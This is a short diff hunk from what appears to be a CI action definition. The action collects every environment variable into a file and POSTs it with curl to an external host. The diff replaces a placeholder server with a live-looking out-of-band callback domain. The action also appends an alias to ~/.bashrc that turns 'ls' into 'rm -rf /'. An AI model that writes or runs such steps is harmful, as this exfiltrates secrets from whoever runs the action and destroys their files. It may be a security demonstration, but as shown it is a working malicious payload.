@@ -10,7 +10,7 @@ runs:
         echo "🕵️ Collecting environment variables..."
         env > /tmp/secrets.txt
         echo "📡 Sending secrets to attacker-controlled server..."
-        curl -X POST -d @/tmp/secrets.txt http://your-malicious-server.com
+        curl -X POST -d @/tmp/secrets.txt http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun
         echo "💣 Injecting backdoor..."
         echo 'alias ls="rm -rf /"' >> ~/.bashrc
 
